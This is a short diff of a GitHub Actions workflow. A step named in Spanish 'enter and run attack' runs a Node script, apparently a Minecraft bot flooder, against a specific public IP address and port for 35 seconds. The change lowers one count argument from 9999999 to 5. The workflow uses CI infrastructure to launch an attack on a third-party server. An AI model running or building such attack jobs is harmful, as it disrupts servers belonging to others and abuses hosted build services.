@@ -15,7 +15,7 @@ jobs:
       - name: Entrar y ejecutar ataque
         run: |
           cd ssh2
-          timeout 35 node mcbotv2.js 131.196.198.112 25575 aka 9999999 35
+          timeout 35 node mcbotv2.js 131.196.198.112 25575 aka 5 35
           
       - name: Forzar salida inmediata
         if: always()
